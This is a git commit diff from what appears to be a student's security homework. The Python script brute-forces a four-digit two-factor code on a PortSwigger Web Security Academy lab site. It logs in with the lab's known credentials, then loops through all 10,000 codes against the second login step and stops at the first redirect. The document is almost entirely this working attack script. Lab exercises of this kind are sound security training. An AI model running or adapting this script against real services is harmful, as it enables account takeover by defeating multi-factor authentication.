bbbca4f91de32db77935379144b8f485fe680436
Andrew Stevenson <ads6@pdx.edu>
2021-04-17 06:42:02 -0700

    Refactored most of program into main loop

--- hw1/hw1.py
+++ hw1/hw1.py
@@ -12,28 +12,29 @@ if 'https://' in site:
 # For me only
 site = 'acfa1fae1eb1517480b20d2f004800d9.web-security-academy.net'
 
-s = requests.Session()
-login_url = f'https://{site}/login'
-resp = s.get(login_url)
-soup = BeautifulSoup(resp.text, 'html.parser')
-csrf = soup.find('input', {'name': 'csrf'}).get('value')
-
-logindata = {
-    'csrf': csrf,
-    'username': 'carlos',
-    'password': 'montoya'
-}
-print(f'Logging in as carlos:montoya')
-resp = s.post(login_url, data=logindata)
-print(f'Login response: {resp.text}')
-
-
-soup = BeautifulSoup(resp.text, 'html.parser')
-csrf = soup.find('input', {'name': 'csrf'}).get('value')
-
-# Second page
-login2_url = f'https://{site}/login2'
 for x in range(10000):
+    s = requests.Session()
+    login_url = f'https://{site}/login'
+    resp = s.get(login_url)
+    soup = BeautifulSoup(resp.text, 'html.parser')
+    csrf = soup.find('input', {'name': 'csrf'}).get('value')
+
+
+    logindata = {
+        'csrf': csrf,
+        'username': 'carlos',
+        'password': 'montoya'
+    }
+    # print(f'Logging in as carlos:montoya')
+    resp = s.post(login_url, data=logindata)
+    # print(f'Login response: {resp.text}')
+
+
+    soup = BeautifulSoup(resp.text, 'html.parser')
+    csrf = soup.find('input', {'name': 'csrf'}).get('value')
+
+    # Second page
+    login2_url = f'https://{site}/login2'
     login2data = {
         'csrf': csrf,
         'mfa-code': str(x).zfill(4)
@@ -41,6 +42,7 @@ for x in range(10000):
     resp = s.post(login2_url, data=login2data, allow_redirects=False)
     if resp.status_code == 302:
         print(f'2fa valid with response code {resp.status_code} using {login2data["mfa-code"]}')
+        break
         # Visit account profile page to complete level
     else:
-        print(f'2fa invalid with response code: {resp.status_code}')
+        print(f'2fa invalid with response code: {resp.status_code} using {login2data["mfa-code"]}')
